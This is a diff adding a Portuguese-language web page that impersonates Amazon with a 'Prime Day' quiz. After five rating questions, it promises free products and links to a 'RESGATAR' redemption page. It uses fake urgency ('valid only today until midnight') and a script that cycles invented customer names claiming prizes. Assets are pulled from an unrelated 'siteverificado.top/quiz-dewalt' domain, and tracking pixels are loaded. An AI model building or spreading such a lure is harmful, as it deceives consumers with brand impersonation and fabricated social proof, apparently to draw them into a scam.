@@ -1,0 +1,979 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+  <script src="js/latest_2.js" async="" defer=""></script>
+    
+    <script src="js/latest_1.js" async="" defer=""></script>
+
+    <script>
+      window.pixelId = "66bd7b681efc9308a6fed98a";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script><script async="" defer="" src="js/pixel_2.js"></script><script async="" defer="" src="js/pixel_1.js"></script><script async="" defer="" src="js/pixel.js"></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <meta name="theme-color" content="#232f3e"> <!-- Cor da barra de status -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <script async="" src="js/fbevents_1.js"></script><script async="" src="js/fbevents.js"></script><script src="js/jquery-3.7.1.min.js" crossorigin="anonymous"></script>
+    <link rel="icon" href="images/K.png" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://siteverificado.top/quiz-dewalt/dewaltloog.pn/index.html">
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <title>Ingresso.com | A Experiência</title>
+    
+    <script src="js/latest.js" async="" defer=""></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap');
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Roboto', sans-serif;
+}
+
+header {
+            background-color: #232f3e;
+            padding: 10px;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+body {
+    color: #232f3e;
+}
+
+
+
+header i {
+    font-size: 18px;
+}
+
+header img {
+    height: 40px;
+    padding: 5px;
+   margin-left: 105px;
+  
+}
+
+#saldo {
+    font-weight: 600;
+    color: #232f3e;
+}
+
+main {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto;
+    margin-top: -30px ;
+    padding: 50px 20px 10px 20px;
+    background: #18ABFF;
+    min-height: 100vh;
+}
+
+.main__saldo {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: start;
+    margin-bottom: 10px;
+}
+
+.main__saldo p {
+    font-size: 24px;
+    font-weight: 500;
+}
+
+.main__saldo p:last-child {
+    color: #545454;
+}
+
+.main__descricao {
+    margin-bottom: 10px;
+}
+
+.main__descricao p {
+    font-size: 16px;
+    font-weight: 400;
+    margin: 5px 0px;
+}
+
+.apresentacao {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    border-radius: 100px;
+}
+
+
+.apresentacao h2 {
+    font-size: 18px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    margin-bottom: 10px;
+}
+
+.apresentacao p {
+    font-size: 16px;
+    font-weight: 400;
+    margin-bottom: 10px;
+  
+}
+
+.apresentacao button {
+    width: 100%;
+    padding: 10px 20px;
+    font-size: 18px;
+    font-weight: 600;
+    color: WHITE;
+    background-color: #FF7300;
+    border: none;
+    border-radius: 5px;
+}
+
+.popup__container {
+    width: 100%;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    background-color: rgba(0, 0, 0, 0.7);
+    padding: 10px;
+    z-index: 1;
+}
+
+.popup {
+    width: 100%;
+    height: fit-content;
+    display: flex;
+    
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background-color: #ffffff;
+    padding: 0px;
+    border-radius: 10px;
+}
+
+.popup__titulo {
+    text-align: center;
+}
+
+.popup__titulo h2 {
+    font-weight: 600;
+    letter-spacing: 0.5px;
+}
+
+.popup__verificado {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin: 20px 0px;
+}
+
+.popup__verificado i {
+    font-size: 120px;
+    background-color: #FF7300;
+    padding: 20px 27.5px;
+    border-radius: 50%;
+    color: white;
+}
+
+.popup__verificado p {
+    font-size: 24px;
+    font-weight: 700;
+    margin-top: 10px;
+    color: #FF7300;
+    letter-spacing: 1px;
+}
+
+.popup__descricao {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+
+.popup__descricao h2 {
+    font-size: 18px;
+    font-weight: 700;
+    color: #971052;
+    letter-spacing: 0.5px;
+}
+
+.popup__descricao p {
+    font-size: 18px;
+    font-weight: 500;
+}
+
+.popup__botao {
+    width: 100%;
+    margin-top: 20px;
+}
+
+.popup__botao button {
+    width: 100%;
+    padding: 10px 20px;
+    font-size: 18px;
+    font-weight: 600;
+    color: #313231;
+    background-color: #FF7300;
+    border: none;
+    border-radius: 5px;
+}
+
+.popup__vermelho {
+    text-align: center;
+}
+
+.popup__vermelho i {
+    font-size: 120px;
+    background-color: #ff0000;
+    padding: 20px 35px;
+    border-radius: 50%;
+    color: white;
+    margin: 20px 0px;
+}
+
+.popup__descricao.baixar {
+    text-align: center;
+}
+
+.popup__descricao.baixar p {
+    font-weight: 500;
+}
+
+.popup__descricao.baixar p:first-child {
+    margin-bottom: 10px;
+}
+
+.texto__azul {
+    color: #971052;
+}
+
+.texto__vermelho {
+    color: #ff0000;
+}
+
+.card {
+    width: 100%;
+    height: fit-content;
+    padding: 20px;
+    background: white);
+    background: white);
+    
+    border-width: 5px;        /* largura da borda */
+    border-style:outset;      /* estilo da borda */
+    border-color: #FF7300;       /* cor da borda */
+    border-radius: 15px;       /* arredondamento dos cantos */
+}
+
+.card__logo img {
+    width: 100%;
+    border-radius: 5px;
+    margin-bottom: 20px;
+}
+
+.card__satisfacao {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+.card__satisfacao h2,
+.card__resposta h2 {
+    text-align: center;
+    font-size: 16px;
+    font-weight: 400;
+    letter-spacing: 0.5px;
+}
+
+.card__gradeContainer {
+    display: grid;
+    width: 100%;
+    grid-template-rows: 1fr;
+    grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
+    grid-gap: 10px;
+    margin-top: 20px;
+}
+
+.card__grade {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius:15px;
+    transition: all ease 0.3s;
+}
+
+.card__grade i {
+    font-size: 32px;
+    color: #7e7e7e;
+}
+
+.card__gradeDescricao {
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    font-size: 12px;
+    margin: 5px 0px 20px 0px;
+    color: #7e7e7e;
+}
+
+.resposta__gradeContainer {
+    display: grid;
+    grid-template-rows: 1fr;
+    grid-template-columns: 1fr 1fr;
+    grid-gap: 10px;
+    margin: 10px 0px 20px 0px;
+}
+
+.resposta__grade {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 10px 15px;
+    background-color: #d3d3d3;
+    border-radius: 5px;
+    transition: all ease 0.3s;
+}
+
+.resposta__grade.active {
+    color:white;
+    background-color: #FF7300;
+}
+
+.resposta__grade p {
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.5;
+    text-align: center;
+}
+
+.card__enviarResposta {
+    width: 100%;
+    font-size: 16px;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+    padding: 10px 20px;
+    background-color: #d3d3d3;
+    border-radius: 5px;
+    outline: none;
+    border: none;
+    transition: all ease 0.3s;
+}
+
+.card__enviarResposta.active {
+    color: white;
+    background-color: #FF7300;
+    
+}
+
+.main__videoContainer {
+    width: 100%;
+    height: calc(100vh - 50px);
+}
+
+.main__videoTitulo h2 {
+    font-size: 16px;
+    font-weight: 500;
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.main__botao {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.main__botao button {
+    width: 100%;
+    padding: 10px 20px;
+    font-size: 18px;
+    font-weight: 600;
+    color: white;
+    background-color: #FF7300;
+    border: none;
+    border-radius: 5px;
+    margin-top: 30px;
+}
+
+.finalizacao {
+    background-color: white;;
+    margin-top: -60px;
+}
+
+.finalizacao__titulo {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 10px;
+}
+
+.finalizacao__titulo h1 {
+     font-size: 20px;
+     color: #FF7300;
+}
+.finalizacao__trofeu h2 {
+    color: #FF7300;
+}
+
+.finalizacao__trofeu {
+    width: 100%;
+    display: flex;
+    
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 10px;
+}
+
+.finalizacao__trofeu img {
+    width: 80%;
+    margin-bottom: 10px;
+}
+
+.finalizacao__trofeu h2 {
+    font-size: 48px;
+}
+
+.finalizacao__descricao p {
+    font-size: 14px;
+    font-weight: 400;
+    margin-bottom: 5px;
+}
+
+.finalizacao__descricao p:last-child {
+    margin-top: 5px;
+}
+
+.finalizacao__descricao span {
+    font-size: 12px;
+}
+
+.finalizacao__botao button {
+    width: 100%;
+    padding: 10px 20px;
+    font-size: 18px;
+    font-weight: 600;
+    color: #ffffff;
+    background-color: #FF7300;;
+    border: none;
+    border-radius: 5px;
+    margin-top: 10px;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(1);
+    }
+    50% {
+        transform: scale(0.9);
+    }
+    100% {
+        transform: scale(1);
+    }
+}
+
+@media screen and (min-width: 769px) {
+    main,
+    .popup {
+        max-width: 540px;
+    }
+
+}
+    </style>
+
+  <script async="" defer="" src="js/pixel_2.js"></script></head>
+  <body>
+    <header>
+        
+      <i class="fa-solid fa-bars" style="color: white"></i>
+      <!-- <img src="assets/images/google_logo.svg" alt=""> -->
+      <img src="images/amazonlogo.png" alt="">
+      
+      <span id="saldo" style="margin-left: auto"></span>
+      
+    </header>
+    
+ 
+    <main>
+      <div class="card pergunta01" id="pergunta01">
+        <div class="card__logo">
+          <img src="images/A1.png" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>Avalie a sua experiência geral com o Amazon Prime Day de 1 a 5 estrelas:</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>
+           Você já fez compras durante o Amazon Prime Day?
+          </h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Não</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você considera os descontos do Amazon Prime Day atrativos?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta01()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+      <div class="card pergunta02" id="pergunta02" style="display: none">
+        <div class="card__logo">
+          <img src="images/A2.png" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>
+          Avalie a variedade de produtos disponíveis no Amazon Prime Day de 1 a 5 estrelas:
+          </h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>
+            Você já comprou eletrônicos durante o Amazon Prime Day?
+          </h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Não</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você aproveita as ofertas do Amazon Prime Day para comprar presentes?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta02()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+
+      <div class="card pergunta03" id="pergunta03" style="display: none">
+        <div class="card__logo">
+          <img src="images/A3.png" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>Avalie a facilidade de navegação no site da Amazon durante o Prime Day de 1 a 5 estrelas:</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você considera as ofertas do Amazon Prime Day melhores que as de outras promoções?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Não</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>
+            Você já comprou produtos de casa e cozinha durante o Amazon Prime Day?
+          </h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta03()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+
+      <div class="card pergunta04" id="pergunta04" style="display: none">
+        <div class="card__logo">
+          <img src="images/A4.png" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>Avalie a entrega dos produtos comprados no Amazon Prime Day de 1 a 5 estrelas:</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você acha que o Amazon Prime Day é uma boa oportunidade para economizar?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Não</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você costuma comparar preços em outras lojas antes de comprar no Amazon Prime Day?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta04()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+
+      <div class="card pergunta05" id="pergunta05" style="display: none">
+        <div class="card__logo">
+          <img src="images/AMAZOn-2.png" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>
+           	Avalie a comunicação e promoções da Amazon sobre o Prime Day de 1 a 5 estrelas:
+          </h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>
+            Você recomenda o Amazon Prime Day para amigos e familiares?
+
+          </h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Não</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Quer ganhar produtos GRÁTIS do Prime Day?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sim, eu quero</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta05()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+      <div class="card finalizacao" id="finalizacao" style="display: none">
+        <div class="finalizacao__titulo">
+          <h1>🎉 Parabéns! Você concluiu nosso Quiz Exclusivo Prime Day!</h1>
+        </div>
+        <div class="finalizacao__trofeu">
+          <img src="images/AP.png" alt="">
+        </div>
+        <div class="finalizacao__descricao">
+          <p>
+            Você chegou ao final e foi incrível ver o seu interesse e conhecimento sobre o Prime Day!<br>
+            Sua jornada através do universo Prime Day não apenas mostrou seu interesse pela Amazon, mas também garantiu <strong>produtos exclusivos GRÁTIS</strong><br>
+            
+            Clique no botão Resgatar abaixo e aproveite!<br><br>
+
+            Não perca, esta é a sua chance de mostrar seu orgulho Prime Day! Esta oferta é válida somente hoje até meia-noite.<br>
+            <strong>Muito obrigado por se conectar conosco!</strong>
+          </p>
+        </div>
+        <div class="finalizacao__botao">
+          <a href="/quiz/resgatar/"><button><i class="fa-solid fa-gift"></i>RESGATAR</button></a>
+        </div>
+      </div>
+
+      <button data-bs-toggle="modal" data-bs-target="#modal01" id="popup" style="display: none"></button>
+
+      <div class="modal" tabindex="-1" id="modal01">
+        <div class="modal-dialog modal-dialog-centered">
+          <div class="modal-content">
+            <div class="card apresentacao">
+              <h2>
+                 🎉 Pesquisa Exclusiva para Clientes Amazon 🎉
+              </h2>
+             
+             
+              <p>
+               Seja muito bem-vindo(a) ao nosso evento especial! Prime Day, estamos aqui para celebrar os melhores preços do Brasil.<br><br>
+                Venha conosco nesta jornada de descobertas e, ao final, <strong>ganhe produtos exclusivos GRÁTIS</strong> <br><br>Animado(a) para começar?
+              </p>
+              <button id="iniciar" type="button" data-bs-dismiss="modal">Vamos começar?</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <audio id="trilha" loop="">
+        <source src="https://siteverificado.top/quiz-dewalt/media/trilha-kenner.mp3" type="audio/mpeg">
+      </audio>
+    </main>
+
+    <script src="js/hideAllExcept.js"></script>
+    <script src="js/selectedCard.js"></script>
+    <script src="js/selectedResponse.js"></script>
+    <script src="js/buttonCheck.js"></script>
+    <script src="js/popup.js"></script>
+    <script src="js/sendResponse.js"></script>
+    <script>
+      $(document).ready(function () {
+        let data = new Date();
+
+        var date = data.getDate();
+        var month = [
+          "Janeiro",
+          "Fevereiro",
+          "Março",
+          "Abril",
+          "Maio",
+          "Junho",
+          "Julho",
+          "Agosto",
+          "Setembro",
+          "Outubro",
+          "Novembro",
+          "Dezembro",
+        ][data.getMonth()];
+        var year = data.getFullYear();
+
+        $("#todayDate").html(`${date} de ${month} de ${year}**`);
+      });
+    </script>
+    <script type="text/javascript" src="js/crypto-js.min.js"></script>
+
+    <script>var popup=document.getElementById("popup");document.addEventListener("DOMContentLoaded",function(){popup.click();var iniciar=document.getElementById('iniciar');iniciar.addEventListener('click',function(){var trilha=document.getElementById('trilha');trilha.volume=0.03;trilha.play();});});</script>
+  
+    <style>
+      .notification {
+  position: fixed;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background-color: #FFA41C;
+  color: #FFFFFF;
+  padding: 10px 15px;
+  border-radius: 5px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+  font-family: 'Amazon Ember', Arial, sans-serif;
+  font-size: 16px;
+  margin-top: 10px;
+  opacity: 0;
+  animation: slideIn 0.5s forwards;
+  z-index: 9999; /* Garante que as notificações fiquem sobrepostas */
+}
+
+@keyframes slideIn {
+  from {
+    transform: translate(-50%, -20px);
+    opacity: 0;
+  }
+  to {
+    transform: translateX(-50%);
+    opacity: 1;
+  }
+}
+
+    </style>
+    <script>
+      const names = [
+      "Letícia Pereira",
+"Diego Nogueira",
+"Sofia Carvalho",
+"João Pedro Santos",
+"Beatriz Azevedo",
+"Matheus Lima",
+"Larissa Monteiro",
+"Thiago Martins",
+"Giovana Alves",
+"Arthur Rocha",
+"Eduarda Ribeiro",
+"Felipe Araújo",
+"Yasmin Barros",
+"Guilherme Teixeira",
+"Bruna Castro",
+"Enzo Almeida",
+"Carolina Dias",
+"Henrique Batista",
+"Juliana Duarte",
+"Rodrigo Fonseca"
+
+      ];
+    
+      let notificationCount = 0;
+    
+      function showNotification(name) {
+        const notification = document.createElement('div');
+        notification.className = 'notification';
+        notification.innerText = `${name} Resgatou o Prêmio`;
+        document.body.appendChild(notification);
+    
+        // Remove a notificação após 4 segundos
+        setTimeout(() => {
+          notification.remove();
+        }, 2000);
+      }
+    
+      function triggerNotifications() {
+        if (notificationCount < names.length) {
+          showNotification(names[notificationCount]);
+          notificationCount++;
+          setTimeout(triggerNotifications, 4000); // Chama a função novamente a cada 2 segundos
+        }
+      }
+    
+      triggerNotifications();
+    </script><div class="notification">Letícia Pereira Resgatou o Prêmio</div><div class="notification">Letícia Pereira Resgatou o Prêmio</div>
+
+<script src="js/latest_3.js" async="" defer=""></script>
+<script>
+  window.pixelId = "66db4ff3af0188413afea2ed";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script></body></html>
